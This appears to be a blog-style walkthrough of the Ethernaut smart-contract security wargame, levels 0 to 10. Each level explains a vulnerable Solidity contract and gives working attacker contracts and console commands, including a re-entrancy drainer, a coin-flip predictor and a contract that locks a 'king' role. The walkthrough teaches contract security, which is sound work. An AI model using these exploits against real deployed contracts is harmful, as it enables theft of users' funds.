I decided to do all the OpenZeppelin [Ethernaut](https://ethernaut.openzeppelin.com/) levels and write down on how I solved each level.

If you want to do the same, I recommend that you try to solve the levels on your own first. If you are stuck, you can always look at the hints or the solutions.

# Table of Contents
1. [Level 0: Intro](#level-0-intro)
2. [Level 1: Fallback](#level-1-fallback)
3. [Level 2: Fal1out](#level-2-fal1out)
4. [Level 3: Coin Flip](#level-3-coin-flip)
5. [Level 4: Telephone](#level-4-telephone)
6. [Level 5: Token](#level-5-token)
7. [Level 6: Delegation](#level-6-delegation)
8. [Level 7: Force](#level-7-force)
9. [Level 8: Vault](#level-8-vault)
10. [Level 9: King](#level-9-king)

## Level 0: Intro <a name="level-0-intro"></a>

This level is the intro into Ethernaut and explains how to set up your wallet and how to use the browser console to interact with the contract.

To start the level, you need to click on the “Get new instance button” to get assigned a new vulnerable contract. MetaMask will open up and ask you to sign a transaction. Once the transaction is signed and included in a block, you can use the browser console to interact with the `contract` variable.

If you type `contract.info()` (or `await contract.info()`) it will execute the `info()` method of the contract and you will get an output in your console asking you to call the next method.

After playing around with the methods, you will be asked to authenticate using a password. But what is the password?

Step 8 contains some vital information: Just as you did with the ethernaut contract, you can inspect this contract's ABI through the console using the contract variable.
We are able to inspect the contract’s ABI using the contract variable. Let’s do that.

We will get an object containing some information about the contract: the address, which methods it has,... wait. There is a `password()` method. Let’s call that one.
Alright, having the string, lets authenticate.
Running `contract.authenticate(password)` will open another MetaMask window asking you to sign a transaction.

Once the transaction is included into a block, we hit the submit button and tada -> We provided the right password :)

### Learning
We learned how to interact with a contract using the `contract` variable, how to call methods and how to inspect a contract. We also learned that the password has been saved in a state variable which is declared as public. This causes the compiler to automatically create a getter function for the state variable and we can call it :) So, it is not a good idea to store sensitive information in a contract ;)

## Level 1: Fallback  <a name="level-1-fallback"></a>

The Fallback level is showing us the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallback {

  using SafeMath for uint256;
  mapping(address => uint) public contributions;
  address payable public owner;

  constructor() public {
    owner = msg.sender;
    contributions[msg.sender] = 1000 * (1 ether);
  }

  modifier onlyOwner {
        require(
            msg.sender == owner,
            "caller is not the owner"
        );
        _;
    }

  function contribute() public payable {
    require(msg.value < 0.001 ether);
    contributions[msg.sender] += msg.value;
    if(contributions[msg.sender] > contributions[owner]) {
      owner = msg.sender;
    }
  }

  function getContribution() public view returns (uint) {
    return contributions[msg.sender];
  }

  function withdraw() public onlyOwner {
    owner.transfer(address(this).balance);
  }

  receive() external payable {
    require(msg.value > 0 && contributions[msg.sender] > 0);
    owner = msg.sender;
  }
}
```

In order to pass the level we have to do the following:
 1. Claim ownership of the contract
 2. Reduce the contracts balance to 0

### First step: Claim ownership
In order to get the ownership of the contract, we are going to have a look at where the `owner` variable is set. There are 2 locations. The first one is in the contribute function.

To become an owner, we would need to contribute more than the actual owner, which is 1000 Eth o.O I don’t have that amount. Do you?
I also don’t see a way of over- or underflowing the value, especially since the SafeMath library is used for uint.

The second location is the receive function. Solidity has two fallback functions: fallback and receive. A fallback function in Solidity is a function within a smart contract that is called if no other function in the contract matches the specified function in the call. This can happen if the call has a typo or if it specifies no function at all. It works, if calldata are included. But it is optionally payable.

The receive() method is used as a fallback function if Ether are sent to the contract and no calldata is provided (no function is specified). It can take any value. If the receive() function doesn’t exist, the fallback() method is used.

We see that the receive function has 2 conditions: msg.value has to be greater than 0 and the sender of the transaction has to have already contributed something.

For the fun of it: Let’s send some Wei to the receive function.
`await contract.sendTransaction({from: player, value:1})`

This transaction reverts :O Well, we haven’t contributed anything before, so let’s do that first ;)

Executing the following command should work `await contract.contribute({value: 1})`

To verify that we really contributed, run `await contract.getContribution()`. It should show that we contribute 1 wei :)

Let’s send some Wei to the receive function again: `await contract.sendTransaction({from: player, value:1})`

Oh yea :D Let’s see if we are the owner now: `await contract.owner() == player` => true 

### Second step: Reduce the contracts balance to 0
Nice. Time to empty the contract: `await contract.withdraw()` and once the transaction has been included into the block: `await getBalance(contract.address)`

You should get a 0. Look at us ;) Time to submit.

### Learning
We learned that Solidity has two types of fallback functions and how to use them. We also learned how to send Ether to a contract and how to withdraw it. There is also the owner contract used to restrict the usage of some methods. Yet, we were able to exploit it :) 

## Level 2: Fal1out  <a name="level-2-fal1out"></a>

The Fal1out level is showing us the following code:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract Fallout {

  using SafeMath for uint256;
  mapping (address => uint) allocations;
  address payable public owner;


  /* constructor */
  function Fal1out() public payable {
    owner = msg.sender;
    allocations[owner] = msg.value;
  }

  modifier onlyOwner {
            require(
                msg.sender == owner,
                "caller is not the owner"
            );
            _;
        }

  function allocate() public payable {
    allocations[msg.sender] = allocations[msg.sender].add(msg.value);
  }

  function sendAllocation(address payable allocator) public {
    require(allocations[allocator] > 0);
    allocator.transfer(allocations[allocator]);
  }

  function collectAllocations() public onlyOwner {
    msg.sender.transfer(address(this).balance);
  }

  function allocatorBalance(address allocator) public view returns (uint) {
    return allocations[allocator];
  }
}
```

Our objective is to become the owner of the contract.

When you read the code you will quickly realize that there is one location, where the owner is set: in the `Fal1out()` function, which has an additional comment that this is a constructor. If you inspect it closely, you will see that it contains a typo :O Instead of the function being called Fallout, it is Fal1out, where one l is a 1. In that case it is not a constructor but just a function of the contract. Ooops.

All you have to do: deploy an instance of the contract, send a transaction invoking the Fal1out function (await contract.Fal1out() )and you are the owner :)

### Learning:
Be careful when naming your constructor. Even better: Do not use named constructor functions, but use the `contructor` keyword instead. In that case you will not make this mistake.

## Level 3: Coin Flip <a name="level-3-coin-flip"></a>
The next level is the coin flip level, where the goal is to guess the correct outcome of a coin flip and build up your winning streak. In order to pass this level you have to guess the correct outcome 10 times in a row 😮

Let’s have a look into the contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

import '@openzeppelin/contracts/math/SafeMath.sol';

contract CoinFlip {

  using SafeMath for uint256;
  uint256 public consecutiveWins;
  uint256 lastHash;
  uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;

  constructor() public {
    consecutiveWins = 0;
  }

  function flip(bool _guess) public returns (bool) {
    uint256 blockValue = uint256(blockhash(block.number.sub(1)));

    if (lastHash == blockValue) {
      revert();
    }

    lastHash = blockValue;
    uint256 coinFlip = blockValue.div(FACTOR);
    bool side = coinFlip == 1 ? true : false;

    if (side == _guess) {
      consecutiveWins++;
      return true;
    } else {
      consecutiveWins = 0;
      return false;
    }
  }
}
```

Alright, we see that we as user have to provide a guess if in a certain round the blockhash of the previous block divided by a factor is 1 or 0. That means if the blockhash of the previous block can be divided without any rest by the factor.
Big question: How can we guess correctly or rather know the outcome in advance?

From an EOA perspective, we could try to get the blockhash of the previous block, calculate the outcome, send a transaction with a very high gas price and hope that we get into the following block. That is rather impossible. Once a block is published, the validators are starting to work on the next block and our transaction won’t be in the pool. And there is the ‘hope’ factor -> not good enough.

Let’s have a look from a contract perspective: As a contract, we could calculate the guess using the same formula as given in this contract and forward the guess to the CoinFlip contract. Since everything is done in one transaction, it sounds way better than the EOA approach. Let’s get to it.

First our attacker contract:

```solidity
pragma solidity ^0.8.7;

interface CoinFlip {
    function flip(bool _guess) external returns (bool);
}

contract Attacker {
    uint256 FACTOR = 57896044618658097711785492504343953926634992332820282019728792003956564819968;
    CoinFlip coinFlipContract;

    event Win();
    event Loose();

    constructor(address _coinFlipContract) {
        coinFlipContract = CoinFlip(_coinFlipContract);
    }

    function attack() public {
        uint256 blockValue = uint256(blockhash(block.number - 1));
        uint256 coinFlip = blockValue / FACTOR;
        bool side = coinFlip == 1 ? true : false;

        if (coinFlipContract.flip(side)) {
            emit Win();
        } else {
            emit Loose();
        }
    }
}
```

We deploy the contract to Goerli and call attack() 10 times :D 
If you want to check if you have won, you can see if you transaction contains the Win event or just read out the consecutiveWins from the CoinFlip contract on the Ethernaut page using the following line: await contract.consecutiveWins()

### Learning:
While writing contracts, do not forget to think about contracts interacting with your contract. This is a perfect example, where from an EOA perspective, it is very difficult to make up to 10 consecutive guesses. But that changes quickly if you start to use a contract in order to interact with the CoinFlip contract.

## Level 4: Telephone <a name="level-4-telephone"></a>

Time to take ownership of the next contract :)
Let’s have a look at the contract in the Telephone level:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Telephone {

  address public owner;

  constructor() public {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}
```

The `changeOwner()` function has an interesting `if` statement: It changes the owner of the contract only if the origin of the transaction (tx.origin) is unequal to the sender (msg.sender).

What’s the difference between the origin and the sender?

The tx.origin global variable refers to the original external account that started the transaction while msg.sender refers to the immediate account (it could be external or another contract account) that invokes the function.

In order to be able to become the owner, we need to deploy a contract, which calls the `changeOwner()` function. Let’s get into it :)

Our attacker contract:

```solidity
pragma solidity ^0.8.7;

interface Telephone {
    function changeOwner(address _owner) external;
}

contract Attacker {
    Telephone telephoneContract;

    constructor(address _telephoneContract) {
        telephoneContract = Telephone(_telephoneContract);
    }

    function attack() public {
        telephoneContract.changeOwner(address(this));
    }
}
```
Deploy the contract with the address of the Telephone address into the network, send a transaction to `takeOver` and you are already the owner, well done.

### Learning:
While writing contracts, do not forget to think about contracts interacting with your contract. This is a perfect example, where an EOA is not able to change the ownership of the contract, but by putting a proxy contract in between the Telephone contract and you, you are able to change the ownership :) 

## Level 5: Token <a name="level-5-token"></a>

Time to get some more tokens :)
Let’s have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Token {

  mapping(address => uint) balances;
  uint public totalSupply;

  constructor(uint _initialSupply) public {
    balances[msg.sender] = totalSupply = _initialSupply;
  }

  function transfer(address _to, uint _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
  }

  function balanceOf(address _owner) public view returns (uint balance) {
    return balances[_owner];
  }
}
```

The description of the level tells us that we start off with 20 tokens. That’s generous. Our objective is to obtain more tokens, ideally a lot more :D

To verify that we really have 20 tokens we call the `balanceOf()` function using the following code: `await contract.balanceOf(player)`

Well, we own 20 tokens :)

So, how do we get more tokens?
Let’s have a look at the `transfer()` function. The transfer checks if the user's balance minus the amount to be transferred is greater than 0.
Since the balances mapping stores units, we can do the following: We would like to transfer 21 tokens to another address. This results into the following calculation: 20-21=2^256-1 and 2^256-1 is definitely greater than 0 :)
So, `await contract.transfer(‘0xSomeAddress’, 21)` should work.
We wait for the transaction to be included into a block.
Now we check our balance and baam. We now own a shit ton of tokens :) Way to go.

### Learning:
Overflows are very common in solidity and must be checked for with control statements such as:
```solidity
if(a + c > a) {
  a = a + c;
}
```
An easier alternative is to use OpenZeppelin's SafeMath library that automatically checks for overflows in all the mathematical operators. The resulting code looks like this:
a = a.add(c);
If there is an overflow, the code will revert.

## Level 6: Delegation <a name="level-6-delegation></a>

The goal of this level is for you to claim ownership of the instance you are given.
Contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;

contract Delegate {

  address public owner;

  constructor(address _owner) public {
    owner = _owner;
  }

  function pwn() public {
    owner = msg.sender;
  }
}

contract Delegation {

  address public owner;
  Delegate delegate;

  constructor(address _delegateAddress) public {
    delegate = Delegate(_delegateAddress);
    owner = msg.sender;
  }

  fallback() external {
    (bool result,) = address(delegate).delegatecall(msg.data);
    if (result) {
      this;
    }
  }
}
```

First, let’s have a look at what delegatecall is.

delegatecall is a low level function similar to call.
When contract A executes delegatecall to contract B, B's code is executed
with contract A's storage, `msg.sender` and `msg.value`.

Here an example taken from https://solidity-by-example.org/delegatecall/ 

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

// NOTE: Deploy this contract first
contract B {
    // NOTE: storage layout must be the same as contract A
    uint256 public num;
    address public sender;
    uint256 public value;

    function setVars(uint256 _num) public payable {
        num = _num;
        sender = msg.sender;
        value = msg.value;
    }
}

contract A {
    uint256 public num;
    address public sender;
    uint256 public value;

    function setVars(address _contract, uint256 _num) public payable {
        // A's storage is set, B is not modified.
        (bool success, bytes memory data) = _contract.delegatecall(
            abi.encodeWithSignature("setVars(uint256)", _num)
        );
    }
}
```

As we can see in the example, the `delegatecall` in contract A gets 2 parameters, the signature of the `setVars()` function to be called in contract B and a parameter for the `setVars()` function.

If we compare it with the contract from the Ethernaut level, we realize, that we have to provide the signature of the `pwn()` function to contract Delegation in msg.data.

So here is what we have to do in the console of the browser:

`await sendTransaction({from: player, to: contract.address, data: web3.eth.abi.encodeFunctionSignature("pwn()")})`

And now you are the owner :) Congrats :)

### Learning:
Usage of delegatecall is particularly risky and has been used as an attack vector on multiple historic hacks. With it, your contract is practically saying "here, -other contract- or -other library-, do whatever you want with my state". Delegates have complete access to your contract's state. The delegatecall function is a powerful feature, but a dangerous one, and must be used with extreme care.

## Level 7: Force <a name="level-7-force"></a>

We have the following contract in the Force level:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Force { /*
                   MEOW ?
         /\_/\   /
    ____/ o o \
    /~____  =ø= /
    (______)__m_m)
                   */ }
```

and out objective is to increase the balance.

In a previous level we learned about fallback functions. If we call a contract where the function signature doesn't match any of the functions in the contract, the fallback function is called. 

In this example there is no payable `fallback()` and no `receive()` function defined. So, there is no way to send Ether to the contract by using an EOA.

Instead we are going to make use of the `selfdestruct()` function. The `selfdestruct()` function is used to destroy the contract and send its funds to a designated address.

Here is the code to do that:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Payer {
    uint public balance = 0;

    function destruct(address payable _beneficiary) external payable {
        selfdestruct(_beneficiary);
    }

    receive() external payable {
        balance += msg.value;
    }
}
```

Deploy the contract, send a small amount of Ether to the contract and call the `destruct()` function with the address of the Force contract. The balance of the Force contract should now be increased by the amount of Ether you sent to the Payer contract.

### Learning:
The `selfdestruct()` function is used to destroy the contract and send its funds to a designated address. It is a dangerous function and should be used with caution.

## Level 8: Vault <a name="level-8-vault"></a>

The Vault level has the following contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Vault {
    bool public locked;
    bytes32 private password;

    constructor(bytes32 _password) {
        locked = true;
        password = _password;
    }

    function unlock(bytes32 _password) public {
        if (password == _password) {
            locked = false;
        }
    }
}
```

and our task is to unlock the vault.

Let's make sure first that it is indeed locked. Type the following into your console:

`await contract.locked()` and you should get `true`.

The password is stored as a private variable in the contract. We can't access it directly, but we can try to guess it. We can use a brute force attack to try all possible combinations of the password. Let's ...

Just joking - it's bytes32, so it's not possible to brute force it :D Who is going to pay all those gas fees?

Instead, let's just read the storage of the contract :O READ STORAGE YOU SAY?

Yes, read the storage :) Just because a variable is marked as private, it doesn't mean that it is not accessible. It is just a convention to mark it as private, which means for the compiler to not create getter and setter functions. The storage of a contract is public and can be read by anyone.

Here is the code to read the storage:

```bash
curl <rpc endpoint> -X POST -H "Content-Type: application/json" \
  --data '{"method":"eth_getStorageAt","params":["<contract address>", "<slot>", "latest"],"id":1,"jsonrpc":"2.0"}'
```

The slot is the position of the variable in the storage. The password is the second variable in the storage, so the slot is 1.

Once you send the request, you will get a response, which contains the password.

We simply copy the password and call the `unlock()` function with the password as a parameter. The vault is now unlocked.

Time to submit ;)

### Learning:

Just because a variable is marked as private, it doesn't mean that it is not accessible. It is just a convention to mark it as private, which means for the compiler to not create getter and setter functions. The storage of a contract is public and can be read by anyone. Do not store any sensitive information in a contract :)

## Level 9: King <a name="level-9-king"></a>

The King level has the following contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract King {
    address king;
    uint256 public prize;
    address public owner;

    constructor() payable {
        owner = msg.sender;
        king = msg.sender;
        prize = msg.value;
    }

    receive() external payable {
        require(msg.value >= prize || msg.sender == owner);
        payable(king).transfer(msg.value);
        king = msg.sender;
        prize = msg.value;
    }

    function _king() public view returns (address) {
        return king;
    }
}
```

Our task: To make sure that no one else becomes the king after the obtained the crown.

The contract has a `receive()` function, which is called when the contract receives Ether. The function checks if the value of the Ether sent is greater than or equal to the prize or if the sender is the owner of the contract. If the condition is met, the Ether is transferred to the current king and the sender becomes the new king.

The contract also has a `_king()` function, which returns the address of the current king.

The question is: How can we make sure that we remain the king, no matter what?

Before we look into that, let's see who is currently king: `await contract._king()`
shows us that `0xDed9f3474fe5f075Ed7953f36a493928b1BD9f31` is king.
And let's see how much we have to send in order to become king:
`await contract.prize().then(v => v.toString())` shows us `1000000000000000` Wei.

Alright, let's get to work. 

It is actually rather simple. See the following attack contract:

```solidity
pragma solidity ^0.8.0;

contract KingSlayer {

    function attack(address _contract) public payable {
        (bool sent, ) = _contract.call{value: msg.value}("");
        require(sent, "Failed to send value!");
    }
}
```

Deploy the contract, send a transaction to the `attack()` function with the address of the King contract and the amount of Ether you want to send. The King contract will now receive the Ether and you will become the new king.

If someone else will try to become the king, they will send the Ether and the 
King contract is going to transfer the Ether to our contract. But since our
contract has no fallback or receive function, the transaction will fail and
we will remain the king.

Our contract has to use the `call` function to send the Ether, because the
`transfer` and `send` function would fail in this case, due to the gas limit
of 2300 gas. The receive function of the King contract requires more gas.

### Learning
Look always from the perspective of a Smart Contract. Can another smart contract
break my contract, by not having some functions implemented? 
And since December 2019 - use `call` instead of `transfer` or `send` to send
Ether.

## Level 10: Re-entrancy <a name="level-10-re-entrancy"></a>

The one, the legendary, the whole grail of attacks - at least based on the history involved
where this attack has been used.

Let's have a look at the contract first:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.6.12;

import "openzeppelin-contracts-06/math/SafeMath.sol";

contract Reentrance {
    using SafeMath for uint256;

    mapping(address => uint256) public balances;

    function donate(address _to) public payable {
        balances[_to] = balances[_to].add(msg.value);
    }

    function balanceOf(address _who) public view returns (uint256 balance) {
        return balances[_who];
    }

    function withdraw(uint256 _amount) public {
        if (balances[msg.sender] >= _amount) {
            (bool result,) = msg.sender.call{value: _amount}("");
            if (result) {
                _amount;
            }
            balances[msg.sender] -= _amount;
        }
    }

    receive() external payable {}
}
```

What does re-entrancy in context of smart contracts mean? It means that a contract calls another contract and the called contract calls back the calling contract before the first call is finished. This can lead to unexpected behavior and can be exploited to drain the funds of the calling contract.


So, here is our attacker contract:

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

abstract contract Reentrance {
    function donate(address _to) virtual external payable;
    function withdraw(uint256 _amount) virtual external;
}

contract Attacker {
    
    Reentrance public re;
    uint public amount_sent;

    constructor(address _contract) {
        re = Reentrance(_contract);
    }

    function attack() external payable {
        amount_sent = msg.value;
        re.donate{value: amount_sent}(address(this));
        re.withdraw(amount_sent);
    }

    receive() external payable {
        uint balanceOfTarget = address(re).balance;
        if (balanceOfTarget >= amount_sent) {
            re.withdraw(amount_sent);
        }
        
    }
}
```

Once our attacker contract is deployed, we are going to call the `attack()` function,
where we send some funds to it. Our contract is going to call the `donate()` function
and forward our funds to the Reentrance contract.

Our contract now holds some funds in the Reentrancy contract.

Now to the attack: We call the `withdraw()` function of the Reentrancy contract. The
Reentrancy contract is going to send the funds to our contract and therefore triggering
our `receive()` function. During the execution of the `receive()` function, we call the
`withdraw()` function of the Reentrancy contract again. Since the balance
has not been updated yet, the Reentrancy contract is going to send the funds again
to our contract. This can be repeated until the Reentrancy contract has no funds left.

Nice, isn't it? :)

### Learning
Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and re-enter your contract, possibly messing up your state/logic.

Re-entrancy is a common attack. You should always be prepared for it!